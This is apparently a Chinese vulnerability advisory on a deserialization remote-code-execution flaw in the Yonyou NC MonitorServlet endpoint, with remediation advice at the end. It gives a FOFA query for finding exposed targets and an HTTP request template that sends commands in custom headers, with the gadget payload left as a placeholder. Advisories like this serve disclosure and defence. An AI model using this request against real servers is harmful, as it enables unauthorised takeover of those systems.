---
fofa: "app=\"用友-NC\""
source: "afrog-pocs/zan8in"
---

# 用友 NC MonitorServlet 反序列化RCE漏洞

# 漏洞描述

用友 NC /servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet 接口存在 Java 反序列化漏洞。攻击者可向该接口发送精心构造的 Commons-Collections 反序列化 gadget 数据包实现远程代码执行，直接获取服务器控制权。

# 影响版本

用友 NC（NC65 及相关版本）

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 未知 |

# 漏洞复现

FOFA：app="用友-NC"

利用方式：向目标接口 POST 发送经 Commons-Collections 构造链序列化的恶意数据，并通过 HTTP 请求头 `X-T0KEN` / `X-T0KEN-INF0` 传递待执行命令：

```
POST /servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet HTTP/1.1
Host: {{Hostname}}
Content-Type: application/octet-stream
X-T0KEN: <随机标识>
X-T0KEN-INF0: <待执行命令，如 whoami>
Accept-Encoding: gzip, deflate
Connection: close

<序列化后的 Commons-Collections gadget 二进制数据>
```

命令执行结果经响应返回。公开 PoC（afrog yonyou-nc-monitorservlet-rce）已给出完整的序列化数据构造与命令回显流程。

# 漏洞修复

联系用友官方获取安全补丁，禁用该接口的反序列化入口或升级至已修复版本；对反序列化数据做签名校验。
